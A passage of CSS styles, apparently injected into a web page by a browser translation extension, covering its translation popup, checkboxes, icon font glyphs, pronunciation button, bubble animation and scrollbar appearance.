          padding: 4px 0;
          align-items: center;
          cursor: pointer; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__checkbox__cgTFI {
            display: inline-flex;
            width: 14px;
            height: 14px;
            margin-right: 5px;
            border: 1px solid #011627;
            border-radius: 2px;
            outline: none;
            flex-shrink: 0;
            justify-content: center;
            align-items: center; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__checkbox__cgTFI > i {
              display: none;
              color: #011627;
              font-size: 11px; }
              .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__checkbox__cgTFI > i:before {
                margin: 0; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__checkbox__cgTFI:focus {
              border-color: #cc7f16; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__checkbox__cgTFI.Translator__checked__REDlo > i {
              display: inline; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ:hover > .Translator__checkbox__cgTFI {
            box-shadow: inset 0 0 4px #73d7ce; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__term__3UT78 {
            min-height: 20px;
            max-height: 116px;
            flex-grow: 1;
            word-break: break-word;
            overflow: auto; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > input {
            text-overflow: ellipsis;
            white-space: nowrap;
            overflow: hidden;
            width: 0;
            padding: 0;
            border: none;
            flex-grow: 1;
            font-size: 15px;
            line-height: 20px; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__add-custom__2QhtK {
          display: flex;
          width: 14px;
          height: 14px;
          margin-top: 7px;
          border: 1px solid #011627;
          border-radius: 2px;
          outline: none;
          justify-content: center;
          align-items: center; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__add-custom__2QhtK > i {
            color: #1f837a;
            font-size: 10px; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__add-custom__2QhtK > i:before {
              margin: 0; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__add-custom__2QhtK:focus {
            border-color: #cc7f16; }
</style><style type="text/css">.Button__btn__1lr0f:not(.Button__keep-cursor__V97qw) {
  cursor: pointer; }
  .Button__btn__1lr0f:not(.Button__keep-cursor__V97qw).Button__disabled__38AlQ {
    cursor: not-allowed; }
</style><style type="text/css">@charset "UTF-8";
/* stylelint-disable */
.icon-pencil:before {
  content: '\E800'; }

/* 'î €' */
.icon-ok:before {
  content: '\E801'; }

/* 'î ' */
.icon-ccw:before {
  content: '\E802'; }

/* 'î ‚' */
.icon-globe:before {
  content: '\E803'; }

/* 'î ƒ' */
.icon-info-circled:before {
  content: '\E804'; }

/* 'î „' */
.icon-cancel:before {
  content: '\E805'; }

/* 'î …' */
.icon-edit:before {
  content: '\E806'; }

/* 'î †' */
.icon-plus:before {
  content: '\E807'; }

/* 'î ‡' */
.icon-bookmark:before {
  content: '\E808'; }

/* 'î ˆ' */
.icon-settings:before {
  content: '\E809'; }

/* 'î ‰' */
.icon-down-1:before {
  content: '\E80A'; }

/* 'î Š' */
.icon-up-1:before {
  content: '\E80B'; }

/* 'î ‹' */
.icon-heart:before {
  content: '\E80C'; }

/* 'î Œ' */
.icon-export:before {
  content: '\E80D'; }

/* 'î ' */
.icon-keyboard-2:before {
  content: '\E80E'; }

/* 'î Ž' */
.icon-ok-circled:before {
  content: '\E814'; }

/* 'î ”' */
.icon-cancel-circled:before {
  content: '\E817'; }

/* 'î —' */
.icon-translate:before {
  content: '\E822'; }

/* 'î ¢' */
.icon-anki:before {
  content: '\E823'; }

/* 'î £' */
.icon-anki-1:before {
  content: '\E825'; }

/* 'î ¥' */
.icon-acc-basic:before {
  content: '\E830'; }

/* 'î °' */
.icon-acc-subscriber:before {
  content: '\E831'; }

/* 'î ±' */
.icon-rb-ico:before {
  content: '\E834'; }

/* 'î ´' */
.icon-cog:before {
  content: '\E840'; }

/* 'î¡€' */
.icon-login:before {
  content: '\E845'; }

/* 'î¡…' */
.icon-logout:before {
  content: '\E846'; }

/* 'î¡†' */
.icon-arrow-down-bold:before {
  content: '\E859'; }

/* 'î¡™' */
.icon-scissors:before {
  content: '\E88A'; }

/* 'î¢Š' */
.icon-home:before {
  content: '\E8C2'; }

/* 'î£‚' */
.icon-mute:before {
  content: '\E900'; }

/* 'î¤€' */
.icon-sound:before {
  content: '\E901'; }

/* 'î¤' */
.icon-left-bold:before {
  content: '\E929'; }

/* 'î¤©' */
.icon-down:before {
  content: '\E92C'; }

/* 'î¤¬' */
.icon-up:before {
  content: '\E92F'; }

/* 'î¤¯' */
.icon-switch:before {
  content: '\E937'; }

/* 'î¤·' */
.icon-graduation-cap-1:before {
  content: '\E96A'; }

/* 'î¥ª' */
.icon-floppy:before {
  content: '\E971'; }

/* 'î¥±' */
.icon-facebook:before {
  content: '\E98E'; }

/* 'î¦Ž' */
.icon-webstore:before {
  content: '\EC24'; }

/* 'î°¤' */
.icon-vk:before {
  content: '\EC71'; }

/* 'î±±' */
.icon-mail:before {
  content: '\ECD3'; }

/* 'î³“' */
.icon-graduation-cap:before {
  content: '\EE02'; }

/* 'î¸‚' */
.icon-emo-happy:before {
  content: '\EE63'; }

/* 'î¹£' */
.icon-emo-unhappy:before {
  content: '\EE66'; }

/* 'î¹¦' */
.icon-spin1:before {
  content: '\EE77'; }

/* 'î¹·' */
.icon-bookmark-empty:before {
  content: '\F097'; }

/* 'ï‚—' */
.icon-filter:before {
  content: '\F0B0'; }

/* 'ï‚°' */
.icon-paste:before {
  content: '\F0EA'; }

/* 'ïƒª' */
.icon-angle-double-left:before {
  content: '\F100'; }

/* 'ï„€' */
.icon-angle-double-right:before {
  content: '\F101'; }

/* 'ï„' */
.icon-angle-left:before {
  content: '\F104'; }

/* 'ï„„' */
.icon-angle-right:before {
  content: '\F105'; }

/* 'ï„…' */
.icon-angle-down:before {
  content: '\F107'; }

/* 'ï„‡' */
.icon-minus-squared:before {
  content: '\F147'; }

/* 'ï…‡' */
.icon-export-alt:before {
  content: '\F14D'; }

/* 'ï…' */
.icon-expand-right:before {
  content: '\F152'; }

/* 'ï…’' */
.icon-plus-squared:before {
  content: '\F196'; }

/* 'ï†–' */
.icon-language:before {
  content: '\F1AB'; }

/* 'ï†«' */
.icon-sliders:before {
  content: '\F1DE'; }

/* 'ï‡ž' */
.icon-trash:before {
  content: '\F1F8'; }

/* 'ï‡¸' */
.icon-clone:before {
  content: '\F24D'; }

/* 'ï‰' */
.icon-question-circle-o:before {
  content: '\F29C'; }

/* 'ïŠœ' */
.icon-user-circle:before {
  content: '\F2BD'; }

/* 'ïŠ½' */
.icon-twitter:before {
  content: '\F309'; }

/* 'ïŒ‰' */
.icon-gplus:before {
  content: '\F30F'; }

/* 'ïŒ' */
.icon-linkedin:before {
  content: '\F318'; }

/* 'ïŒ˜' */
[class^="icon-"]:before,
[class*=" icon-"]:before {
  display: inline-block;
  width: 1em;
  margin-right: .2em;
  margin-left: .2em;
  /* For safety - reset parent styles, that can break glyph codes*/
  font-family: "rbicon";
  font-variant: normal;
  font-weight: normal;
  font-style: normal;
  text-transform: none;
  text-align: center;
  text-decoration: inherit;
  -webkit-font-smoothing: antialiased;
  speak: none; }

/* stylelint-enable */
</style><style type="text/css">.Pronouncer__loading__2zqT4,
.Pronouncer__loading__2zqT4 > i {
  cursor: wait; }
</style><style type="text/css">@keyframes Bubble__zoom-in-out__1nY8w {
  0% {
    transform: translateX(-50%) scale(0.9); }
  50% {
    transform: translateX(-50%) scale(1.1); }
  100% {
    transform: translateX(-50%) scale(1); } }

.Bubble__bubble__2jKwp {
  position: absolute;
  z-index: 1009;
  transform: translateX(-50%);
  width: 28px;
  height: 28px;
  border-radius: 4px;
  box-shadow: 0 0 8px rgba(1, 22, 39, 0.3);
  background-color: #2EC4B6;
  animation: Bubble__zoom-in-out__1nY8w 200ms ease-out;
  transition: box-shadow 150ms ease-out; }
  .Bubble__bubble__2jKwp > i {
    display: inline-block;
    width: 100%;
    height: 100%;
    color: #FDFFFC;
    font-size: 18px;
    line-height: 28px;
    text-align: center;
    text-shadow: 0 1px #20897f; }
    .Bubble__bubble__2jKwp > i:before {
      margin: 0; }
  .Bubble__bubble__2jKwp:active > i {
    text-shadow: 0 -1px #20897f; }
</style><style type="text/css">::-webkit-scrollbar {
  width: 8px; }

::-webkit-scrollbar-thumb {
  border-radius: 8px;
  background-color: rgba(0, 0, 0, 0.45); }

main {
  all: initial;
  font-size: 16px;
  font-family: Georgia, Trebuchet MS, Helvetica, Helvetica Neue;
  -webkit-font-smoothing: antialiased; }

* {
  box-sizing: border-box; }

input,
button,
select {
  outline: none;
  font-family: Georgia, Trebuchet MS, Helvetica, Helvetica Neue;
  -webkit-font-smoothing: antialiased; }
</style></template></div></body></html>